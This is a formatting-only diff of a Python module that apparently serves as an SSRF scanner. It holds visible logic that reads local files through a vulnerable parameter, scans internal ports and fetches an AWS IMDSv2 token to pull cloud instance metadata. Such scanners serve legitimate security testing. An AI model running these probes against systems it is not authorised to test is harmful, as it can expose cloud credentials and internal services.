@@ -85,7 +85,9 @@ def check_file_read(url: str, param: str, sess=None, timeout=10.0) -> list:
         try:
             r = sess.get(_build_url(url, param, target), timeout=timeout)
             if len(r.text) > 50:
-                results.append({"target": target[:30], "size": len(r.text), "preview": r.text[:100]})
+                results.append(
+                    {"target": target[:30], "size": len(r.text), "preview": r.text[:100]}
+                )
         except Exception as e:
             logger.debug("file_read %s: %s", target[:20], e)
     return results
@@ -105,8 +107,11 @@ def check_cloud_metadata(url: str, param: str, sess=None, timeout=10.0) -> Dict:
                 for cloud, patterns in CLOUD_EVIDENCE.items():
                     for pat in patterns:
                         if re.search(pat, r.text, re.IGNORECASE):
-                            result[cloud] = {"url": target[:30], "size": len(r.text),
-                                              "preview": r.text[:150]}
+                            result[cloud] = {
+                                "url": target[:30],
+                                "size": len(r.text),
+                                "preview": r.text[:150],
+                            }
                             break
         except Exception as e:
             logger.debug("cloud_meta %s: %s", target[:20], e)
@@ -127,8 +132,14 @@ class SSRFLateral:
             try:
                 r = self.sess.get(_build_url(url, param, target), timeout=self.timeout)
                 if r.status_code not in (502, 504, 0) and len(r.text) > 10:
-                    results.append({"port": port, "service": target,
-                                    "status": r.status_code, "size": len(r.text)})
+                    results.append(
+                        {
+                            "port": port,
+                            "service": target,
+                            "status": r.status_code,
+                            "size": len(r.text),
+                        }
+                    )
             except Exception as e:
                 logger.debug("port_scan port %d: %s", port, e)
         return results
@@ -139,16 +150,18 @@ class SSRFLateral:
             resp = self.sess.put(
                 "http://169.254.169.254/latest/api/token",
                 headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
-                timeout=self.timeout
+                timeout=self.timeout,
             )
             if resp.status_code == 200:
                 token = resp.text.strip()
                 result["imdsv2_token"] = token[:20]
                 for meta_url in CLOUD_META["aws"]:
                     try:
-                        r = self.sess.get(meta_url,
-                                          headers={"X-aws-ec2-metadata-token": token},
-                                          timeout=self.timeout)
+                        r = self.sess.get(
+                            meta_url,
+                            headers={"X-aws-ec2-metadata-token": token},
+                            timeout=self.timeout,
+                        )
                         if r.status_code == 200 and len(r.text) > 20:
                             result[meta_url[:40]] = r.text[:200]
                     except Exception as e:
@@ -352,14 +365,16 @@ class SSRFLateral:
         return result
 
 
-def run(url: str, param: str, sess: Optional[requests.Session] = None,
-        timeout: float = 10.0) -> Dict:
+def run(
+    url: str, param: str, sess: Optional[requests.Session] = None, timeout: float = 10.0
+) -> Dict:
     ssrf = SSRFLateral(sess, timeout)
     return ssrf.run(url, param)
 
 
-def check(url: str, param: str, sess: Optional[requests.Session] = None,
-          timeout: float = 10.0) -> Dict:
+def check(
+    url: str, param: str, sess: Optional[requests.Session] = None, timeout: float = 10.0
+) -> Dict:
     if sess is None:
         sess = requests.Session()
     sess.verify = settings.verify_ssl
@@ -370,15 +385,19 @@ def check(url: str, param: str, sess: Optional[requests.Session] = None,
 
     has_file_reads = len(file_reads) > 0
     has_cloud = any(len(v) > 0 for v in lateral_result.get("cloud_metadata", {}).values())
-    has_services = any(len(v) > 0 for k, v in lateral_result.items()
-                       if k not in ("cloud_metadata",) and isinstance(v, list))
+    has_services = any(
+        len(v) > 0
+        for k, v in lateral_result.items()
+        if k not in ("cloud_metadata",) and isinstance(v, list)
+    )
 
     result = {
         "vulnerable": has_file_reads or has_cloud or has_services,
         "files": file_reads,
         "cloud_metadata": lateral_result.get("cloud_metadata", {}),
         "internal_services": {
-            k: v for k, v in lateral_result.items()
+            k: v
+            for k, v in lateral_result.items()
             if k not in ("cloud_metadata",) and isinstance(v, list) and len(v) > 0
         },
         "findings": [],
@@ -386,8 +405,12 @@ def check(url: str, param: str, sess: Optional[requests.Session] = None,
     if has_file_reads:
         result["findings"].append(f"ssrf file read: {len(file_reads)} files")
     if has_cloud:
-        result["findings"].append(f"ssrf cloud metadata: {list(lateral_result['cloud_metadata'].keys())}")
+        result["findings"].append(
+            f"ssrf cloud metadata: {list(lateral_result['cloud_metadata'].keys())}"
+        )
     if has_services:
-        result["findings"].append(f"ssrf internal services: {len(result['internal_services'])} types")
+        result["findings"].append(
+            f"ssrf internal services: {len(result['internal_services'])} types"
+        )
 
     return result
